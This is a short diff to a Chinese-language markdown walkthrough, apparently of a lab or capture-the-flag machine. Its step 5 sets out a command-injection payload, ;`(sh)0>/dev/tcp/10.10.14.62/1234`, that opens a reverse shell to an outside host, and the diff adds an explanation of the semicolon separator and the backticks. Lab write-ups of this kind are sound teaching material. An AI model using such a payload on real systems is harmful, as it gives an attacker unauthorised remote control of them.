@@ -22,6 +22,6 @@
 
 5.插入reverse shell取得shell
 
-     ;`(sh)0>/dev/tcp/10.10.14.62/1234`    
+     ;`(sh)0>/dev/tcp/10.10.14.62/1234`   ;表示指令分隔符，它可以讓你在一行中連續執行多個指令。 ``反引號（backticks），表示執行包裹在其內部的命令，並將其輸出插入到命令列中。
  
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/eb0de815-97af-4104-bfd9-5ccb5aea6225)
